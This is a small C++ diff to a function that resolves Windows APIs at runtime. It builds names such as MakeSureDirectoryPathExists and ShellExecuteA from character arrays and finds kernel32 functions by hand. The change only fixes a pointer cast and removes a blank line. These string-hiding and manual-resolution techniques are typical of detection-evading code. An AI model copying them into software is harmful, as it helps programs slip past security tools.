@@ -162,7 +162,7 @@ int getapi() {
 
 	char szMakeSureDirectoryPathExists[] = { 'M','a','k','e','S','u','r','e','D','i','r','e','c','t','o','r','y','P','a','t','h','E','x','i','s','t','s',0 };
 
-	PEParser::getBaseApi(&lpDllKernel32,(DWORD*)&lpGetProcAddress, (DWORD*)&lpLoadLibraryA);
+	PEParser::getBaseApi(&lpDllKernel32,(char**)&lpGetProcAddress, (char**)&lpLoadLibraryA);
 	if (lpGetProcAddress == 0 || lpLoadLibraryA == 0 || lpDllKernel32 == 0)
 	{
 		Public::writelog("lpDllKernel32 or lpLoadLibraryA or lpGetProcAddress null\r\n");
@@ -185,7 +185,6 @@ int getapi() {
 	lpNetWkstaGetInfo = (ptrNetWkstaGetInfo)lpGetProcAddress(lpDllNetApi32, szNetWkstaGetInfo);
 	lpNetApiBufferFree = (ptrNetApiBufferFree)lpGetProcAddress(lpDllNetApi32, szNetApiBufferFree);
 
-	
 	lpDllShell32 = lpLoadLibraryA(szDllShell32);
 	lpShellExecuteA = (ptrShellExecuteA)lpGetProcAddress(lpDllShell32, szShellExecuteA);
 	lpCommandLineToArgvW = (ptrCommandLineToArgvW)lpGetProcAddress(lpDllShell32, szCommandLineToArgvW);
